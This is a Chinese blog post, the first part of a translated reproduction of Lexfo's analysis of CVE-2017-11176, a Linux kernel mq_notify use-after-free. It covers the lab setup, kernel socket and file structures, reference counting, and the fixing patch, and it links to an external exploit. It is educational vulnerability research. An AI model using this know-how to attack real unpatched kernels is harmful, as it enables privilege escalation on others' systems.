<!DOCTYPE html>












  


<html class="theme-next muse use-motion" lang="zh-CN">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
<meta name="theme-color" content="#222"/>


  
  
  <link rel="stylesheet" href="/lib/needsharebutton/needsharebutton.css"/>









  <meta name="google-site-verification" content="JaodW7D6jSkocuG_zIdKbBnDjM2skzLPZwv5CJMuXiM"/>

















<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2"/>

<link rel="stylesheet" href="/css/main.css?v=7.0.1"/>


  <link rel="apple-touch-icon" sizes="180x180" href="/avatar/avatar.jpeg?v=7.0.1">


  <link rel="icon" type="image/png" sizes="32x32" href="/avatar/avatar.jpeg?v=7.0.1">


  <link rel="icon" type="image/png" sizes="16x16" href="/avatar/avatar.jpeg?v=7.0.1">


  <link rel="mask-icon" href="/avatar/avatar.jpeg?v=7.0.1" color="#222">







<script id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '7.0.1',
    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
    back2top: true,
    back2top_sidebar: false,
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta name="description" content="根据lexfo博客进行的CVE-2017-11176分析和复现（第一部分）。">
<meta name="keywords" content="kernel,cve,vul">
<meta property="og:type" content="article">
<meta property="og:title" content="【翻译&amp;复现】CVE-2017-11176分析(1)">
<meta property="og:url" content="https://sunichi.github.io/2019/07/22/CVE-2017-11176-1/index.html">
<meta property="og:site_name" content="Sunichi&#39;s Blog">
<meta property="og:description" content="根据lexfo博客进行的CVE-2017-11176分析和复现（第一部分）。">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="https://github.com/sunichi/hexo_images/blob/master/blog/CVE-2017-11176/1.png?raw=true">
<meta property="og:image" content="https://github.com/sunichi/hexo_images/blob/master/blog/CVE-2017-11176/2.png?raw=true">
<meta property="og:updated_time" content="2019-07-22T05:55:57.515Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="【翻译&amp;复现】CVE-2017-11176分析(1)">
<meta name="twitter:description" content="根据lexfo博客进行的CVE-2017-11176分析和复现（第一部分）。">
<meta name="twitter:image" content="https://github.com/sunichi/hexo_images/blob/master/blog/CVE-2017-11176/1.png?raw=true">






  <link rel="canonical" href="https://sunichi.github.io/2019/07/22/CVE-2017-11176-1/"/>



<script id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>【翻译&复现】CVE-2017-11176分析(1) | Sunichi's Blog</title>
  












  <noscript>
  <style>
  .use-motion .motion-element,
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-title { opacity: initial; }

  .use-motion .logo,
  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Sunichi's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
      
        <h1 class="site-subtitle" itemprop="description">sunichi@DUBHE | learn linux & pwn</h1>
      
    
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="切换导航栏">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home">

    
    
    
      
    

    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br/>首页</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-tags">

    
    
    
      
    

    

    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br/>标签</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">

    
    
    
      
    

    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br/>归档</a>

  </li>

      
      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br/>搜索</a>
        </li>
      
    </ul>
  

  
    

  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off"
             placeholder="搜索..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



  



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://sunichi.github.io/2019/07/22/CVE-2017-11176-1/"/>

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="sunichi"/>
      <meta itemprop="description" content=""/>
      <meta itemprop="image" content="/avatar/avatar.jpeg"/>
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sunichi's Blog"/>
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">【翻译&复现】CVE-2017-11176分析(1)

              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2019-07-22 13:30:00 / 修改时间：13:55:57" itemprop="dateCreated datePublished" datetime="2019-07-22T13:30:00+08:00">2019-07-22</time>
            

            
              

              
            
          </span>

          

          
            
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>根据lexfo博客进行的CVE-2017-11176分析和复现（第一部分）。</p>
<a id="more"></a>
<p>源自文章：</p>
<blockquote>
<p><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html" target="_blank" rel="noopener">https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html</a></p>
<p><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html" target="_blank" rel="noopener">https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html</a></p>
<p><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html" target="_blank" rel="noopener">https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html</a></p>
<p><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html" target="_blank" rel="noopener">https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html</a></p>
</blockquote>
<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>使用Lexfo的博客中Debian 8.6.0 amd64的Linux系统和VMware Fusion进行调试。原博客中有部分代码和脚本无法在实验环境下运行，直接做了修改，因此本文中部分代码和脚本和原文中不一致。</p>
<p>漏洞复现条件：</p>
<ul>
<li>内核版本小于4.11.9</li>
<li>amd64架构</li>
<li>内核使用SLAB分配器</li>
<li>开启SMEP</li>
<li>关闭kASLR和SMAP</li>
<li>内存大于512MB</li>
<li>能够对目标系统进行调试</li>
<li>建议只使用1个CPU</li>
</ul>
<p>测试<a href="https://github.com/lexfo/linux/blob/master/cve-2017-11176.c" target="_blank" rel="noopener">exploit</a>，系统能够被exp crash（需要针对性地调整exp才能在目标系统上getshell）。</p>
<h3 id="0x01-核心基础知识"><a href="#0x01-核心基础知识" class="headerlink" title="0x01 核心基础知识"></a>0x01 核心基础知识</h3><h4 id="进程描述符和current宏"><a href="#进程描述符和current宏" class="headerlink" title="进程描述符和current宏"></a>进程描述符和current宏</h4><p>每个线程都有一个<code>task_struct</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// [include/linux/sched.h]</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">long</span> state;            <span class="comment">// process state (running, stopped, ...)</span></span><br><span class="line">    <span class="keyword">void</span> *<span class="built_in">stack</span>;                    <span class="comment">// task's stack pointer</span></span><br><span class="line">    <span class="keyword">int</span> prio;                       <span class="comment">// process priority</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>;</span>           <span class="comment">// memory address space</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> *<span class="title">files</span>;</span>     <span class="comment">// open file information</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">cred</span>;</span>        <span class="comment">// credentials</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>通过<code>current</code>宏可以获取当前正在运行的<code>task</code>的结构体指针。</p>
<h4 id="文件描述符、文件对象、文件描述表"><a href="#文件描述符、文件对象、文件描述表" class="headerlink" title="文件描述符、文件对象、文件描述表"></a>文件描述符、文件对象、文件描述表</h4><p>在Linux中，有七种文件：常规、目录、链接、字设备、块设备、fifo和socket，它们都用文件描述符来表示。文件描述符本质上是一个整数，只有对特定的进程才有意义。每个文件描述符与文件结构体相关联。</p>
<p>文件对象用来表示一个被打开的文件，它并不需要匹配硬盘上的某个映像。指向file结构体的指针通常被命名为filp(file pointer)。</p>
<p>几个最重要的file结构体成员：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// [include/linux/fs.h]</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> &#123;</span></span><br><span class="line">    <span class="keyword">loff_t</span>                            f_pos;            <span class="comment">// "cursor" while reading file</span></span><br><span class="line">    <span class="keyword">atomic_long_t</span>                     f_count;          <span class="comment">// object's reference counter</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>      *<span class="title">f_op</span>;</span>            <span class="comment">// virtual function table (VFT) pointer</span></span><br><span class="line">  <span class="keyword">void</span>                              *private_data;      <span class="comment">// used by file "specialization"</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>文件描述符和file结构体指针的映射表被称作<code>file descriptor table(fdt)</code>，它并不是1对1映射，可能存在多个描述符映射到同一结构体指针的情况，因此file结构体中有<code>f_count</code>成员来记录引用情况。FDT的结构体被称为<code>fdtable</code>，它就是一个array。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// [include/linux/fdtable.h]</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fdtable</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> max_fds;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> ** <span class="title">fd</span>;</span>      <span class="comment">/* current fd array */</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>将FDT和进程相连接的是<code>files_struct</code>结构体，由于<code>fdtable</code>还包含其他信息，因此并不直接放入<code>task_struct</code>中。<code>files_struct</code>同样可以在多个线程之间共享。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// [include/linux/fdtable.h]</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">atomic_t</span> count;           <span class="comment">// reference counter</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fdtable</span> *<span class="title">fdt</span>;</span>      <span class="comment">// pointer to the file descriptor table</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>指向<code>files_struct</code>的指针保存在<code>task_struct</code>中。</p>
<h4 id="虚函数表-VFT"><a href="#虚函数表-VFT" class="headerlink" title="虚函数表(VFT)"></a>虚函数表(VFT)</h4><p>最广为人知的VFT是<code>struct file_operations</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// [include/linux/fs.h]</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> &#123;</span></span><br><span class="line">    <span class="keyword">ssize_t</span> (*read) (struct file *, <span class="keyword">char</span> __user *, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *);</span><br><span class="line">    <span class="keyword">ssize_t</span> (*write) (struct file *, <span class="keyword">const</span> <span class="keyword">char</span> __user *, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *);</span><br><span class="line">    <span class="keyword">int</span> (*open) (struct inode *, struct file *);</span><br><span class="line">    <span class="keyword">int</span> (*release) (struct inode *, struct file *);</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>由于Linux中所有东西都被看作文件，但其类型又不一样，所以有着不一样的<code>file operations</code>，常被称作<code>f_ops</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file-&gt;f_op-&gt;read)</span><br><span class="line">    ret = file-&gt;f_op-&gt;read(file, buf, count, pos);</span><br></pre></td></tr></table></figure>
<h4 id="Socket、Sock、SKB"><a href="#Socket、Sock、SKB" class="headerlink" title="Socket、Sock、SKB"></a>Socket、Sock、SKB</h4><p><code>socket</code>结构体位于网络栈的顶层。在socket创建过程中，一个新的<code>file</code>结构体被创建并且<code>f_op</code>被设置为<code>socket_file_ops</code>。由于每个文件以文件描述符的形式表示，因此对文件操作的syscall适用于所有文件，对于socket，内核将调用socket的文件操作：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// [net/socket.c]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">socket_file_ops</span> = &#123;</span></span><br><span class="line">    .read = sock_aio_read,      <span class="comment">// &lt;---- calls sock-&gt;ops-&gt;recvmsg()</span></span><br><span class="line">    .write =    sock_aio_write, <span class="comment">// &lt;---- calls sock-&gt;ops-&gt;sendmsg()</span></span><br><span class="line">    .llseek =   no_llseek,      <span class="comment">// &lt;---- returns an error</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于<code>socket</code>结构体实际上应用了BSD socket API，它集成了一个特殊的VFT结构体<code>proto_ops</code>。每个类型的<code>socket</code>（例如AF_INET、AF_NETLINK等）实现它自己的proto_ops`。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// [include/linux/net.h]</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proto_ops</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span>     (*bind)    (struct socket *sock, struct sockaddr *myaddr, <span class="keyword">int</span> sockaddr_len);</span><br><span class="line">    <span class="keyword">int</span>     (*connect) (struct socket *sock, struct sockaddr *vaddr,  <span class="keyword">int</span> sockaddr_len, <span class="keyword">int</span> flags);</span><br><span class="line">    <span class="keyword">int</span>     (*accept)  (struct socket *sock, struct socket *newsock, <span class="keyword">int</span> flags);</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当BSD形式的系统调用被触发，内核总体上遵循以下架构：</p>
<ol>
<li>从FDT中检索<code>file</code>结构体</li>
<li>从<code>file</code>结构体中检索<code>socket</code>结构体</li>
<li>调用<code>proto_ops</code>中的操作</li>
</ol>
<p>因为一些协议的操作可能需要进入到网络栈的底层，所以<code>socket</code>结构体有一个指针指向<code>sock</code>对象。这个指针主要是为了进行<code>socket</code>的协议操作(proto_ops)。<code>socket</code>结构体可以看作是<code>file</code>结构体和<code>sock</code>结构体的”胶水”。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// [include/linux/net.h]</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span>     *<span class="title">file</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock</span>     *<span class="title">sk</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">proto_ops</span>  *<span class="title">ops</span>;</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>sock</code>结构体是一个复杂的结构体，人们可能会把其看作是下层（网卡驱动）和更高级别（socket）之间的中间事物，主要目的是能够以通用方式保持接收和发送的缓冲区。</p>
<p>当通过网卡接收到数据包时，驱动将网络数据包排队到sock的接收缓冲区中。数据包会在缓冲区一直存在直到程序决定接收它（使用recvmsg()系统调用）。发送时也一样，只不过由网卡将数据包从队列移出并发送。</p>
<p>这些网络数据包(are so-called struct sk_buff or skb)。这些缓冲区基本上都是skb的双向链表。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// [include/linux/sock.h]</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span>         sk_rcvbuf;    <span class="comment">// theorical "max" size of the receive buffer</span></span><br><span class="line">    <span class="keyword">int</span>         sk_sndbuf;    <span class="comment">// theorical "max" size of the send buffer</span></span><br><span class="line">    <span class="keyword">atomic_t</span>        sk_rmem_alloc;  <span class="comment">// "current" size of the receive buffer</span></span><br><span class="line">    <span class="keyword">atomic_t</span>        sk_wmem_alloc;  <span class="comment">// "current" size of the send buffer</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sk_buff_head</span> <span class="title">sk_receive_queue</span>;</span>   <span class="comment">// head of doubly-linked list</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sk_buff_head</span> <span class="title">sk_write_queue</span>;</span>     <span class="comment">// head of doubly-linked list</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">socket</span>       *<span class="title">sk_socket</span>;</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>sock</code>结构体引用了<code>socket</code>结构体，而<code>socket</code>结构体也引用了<code>sock</code>结构体。同样地，<code>socket</code>结构体引用<code>file</code>结构体，<code>file</code>结构体引用<code>socket</code>结构体（private_data）。这种双向机制允许数据在网络栈中上下移动。</p>
<p>struct sock对象通常称为sk，而struct socket对象通常称为sock。</p>
<h4 id="Netlink-Socket"><a href="#Netlink-Socket" class="headerlink" title="Netlink Socket"></a>Netlink Socket</h4><p>Netlink Socket是socket的一种类型，就像UNIX或INET套接字一样。Netlink Socket(AF_NETLINK)允许内核和用户态之间的通信，它可以用来修改路由表、接收SELinux事件通知，甚至与其他用户进程通信。</p>
<p>由于<code>sock</code>和<code>socket</code>结构体是支持各种套接字的通用数据结构，因此有必要在某种程度上进行专门化。从socket角度来看，需要定义<code>proto_ops</code>，对于netlink系列，相关操作是<code>netlink_ops</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// [net/netlink/af_netlink.c]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">proto_ops</span> <span class="title">netlink_ops</span> = &#123;</span></span><br><span class="line">    .bind =     netlink_bind,</span><br><span class="line">    .accept =   sock_no_accept,     <span class="comment">// &lt;--- calling accept() on netlink sockets leads to EOPNOTSUPP error</span></span><br><span class="line">    .sendmsg =  netlink_sendmsg,</span><br><span class="line">    .recvmsg =  netlink_recvmsg,</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// [include/net/netlink_sock.h]</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">netlink_sock</span> &#123;</span></span><br><span class="line">    <span class="comment">/* struct sock has to be the first member of netlink_sock */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock</span>     <span class="title">sk</span>;</span></span><br><span class="line">    u32         pid;</span><br><span class="line">    u32         dst_pid;</span><br><span class="line">    u32         dst_group;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>换句话说，<code>netlink_sock</code>是具有一些附加属性的<code>sock</code>。</p>
<p>它允许内核在不知道其精确类型的情况下操作通用<code>sock</code>结构体。 它还带来了另一个好处，＆netlink_sock.sk是＆netlink_sock同个地址。</p>
<h4 id="Putting-it-all-together"><a href="#Putting-it-all-together" class="headerlink" title="Putting it all together"></a>Putting it all together</h4><p><img src="https://github.com/sunichi/hexo_images/blob/master/blog/CVE-2017-11176/1.png?raw=true" alt="数据结构关系图"></p>
<h4 id="Reference-counters"><a href="#Reference-counters" class="headerlink" title="Reference counters"></a>Reference counters</h4><p>为了总结这些内核核心概念的介绍，有必要理解内核如何处理<code>reference counters</code>。为了减少内核内存泄漏和防止UAF，大多数Linux的数据结构中有<code>ref counter</code>，为<code>atomic_t</code>类型（<code>int</code>）。通过如下原子操作对<code>ref counter</code>进行操作：</p>
<ul>
<li>atomic_inc()</li>
<li>atomic_add()</li>
<li>atomic_dec_and_test() // substract 1 and test if it is equals zero</li>
</ul>
<p>这些操作都要由开发人员手动完成。但是存在这样的风险：</p>
<ul>
<li>减少<code>refcounter</code>两次：UAF</li>
<li>增加<code>refcounter</code>两次：内存泄漏或整数溢出导致UAF</li>
</ul>
<p>Linux内核通过普通接口有多种手段处理<code>refcounter</code>(<code>kref</code>,<code>kobject</code>)。但是，它没有系统地使用操作的对象中已有的<code>refcounter helper</code>，而是使用<code>*_get()</code>和<code>*_put()</code>等函数。</p>
<p>在这个例子中，每个对象有不同的<code>helper</code>名字：</p>
<ul>
<li><strong>struct sock</strong>: sock_hold(), sock_put()</li>
<li><strong>struct file</strong>: fget(), fput()</li>
<li><strong>struct files_struct</strong>: get_files_struct(), put_files_struct()</li>
<li><p>…</p>
</li>
<li><p><strong>WARNING</strong>: it can get even more confusing! For instance, <strong>skb_put()</strong> actually does not decrease any refcounter, it “pushes” data into the sk buffer! Do not assume anything about what a function does based on its name, check it.</p>
</li>
</ul>
<p>与本CVE的相关的数据结构以上已介绍完毕，接下来开始分析CVE。</p>
<h3 id="0x02-Public-Information"><a href="#0x02-Public-Information" class="headerlink" title="0x02 Public Information"></a>0x02 Public Information</h3><p>首先介绍下<code>mq_notify</code>系统调用的用途，<code>mq_*</code>代表”POSIX message queues”，用来代替System V message queues：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POSIX message queues allow processes to exchange data in the form of messages.</span><br><span class="line">This API is distinct from that provided by System V message  queues (msgget(2),</span><br><span class="line">msgsnd(2), msgrcv(2), etc.), but provides similar functionality.</span><br></pre></td></tr></table></figure>
<p><code>mq_notify()</code>系统调用用来注册或注销异步提醒：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mq_notify() allows the calling process to register or unregister for delivery of an asynchronous notification when a new message arrives on the empty message queue referred to by the descriptor mqdes.</span><br></pre></td></tr></table></figure>
<p>相关Patch：</p>
<p>在例如4.11.9的内核代码中，<code>mq_notify()</code>没有把<code>sock</code>指针清空在进入<code>retry</code>逻辑之前。当用户态关闭了<code>netlink socket</code>，这个UAF使得攻击能够发起DoS攻击并有可能造成进一步的影响。</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/ipc/mqueue.c b/ipc/mqueue.c</span><br><span class="line">index c9ff943..eb1391b 100644</span><br><span class="line"><span class="comment">--- a/ipc/mqueue.c</span></span><br><span class="line"><span class="comment">+++ b/ipc/mqueue.c</span></span><br><span class="line">@@ -1270,8 +1270,10 @@ retry:</span><br><span class="line"></span><br><span class="line">      timeo = MAX_SCHEDULE_TIMEOUT;</span><br><span class="line">      ret = netlink_attachskb(sock, nc, &amp;timeo, NULL);</span><br><span class="line"><span class="deletion">-     if (ret == 1)</span></span><br><span class="line"><span class="addition">+     if (ret == 1) &#123;</span></span><br><span class="line"><span class="addition">+       sock = NULL;</span></span><br><span class="line">        goto retry;</span><br><span class="line"><span class="addition">+     &#125;</span></span><br><span class="line">      if (ret) &#123;</span><br><span class="line">        sock = NULL;</span><br><span class="line">        nc = NULL;</span><br></pre></td></tr></table></figure>
<p>Patch的描述提供了更多的信息：</p>
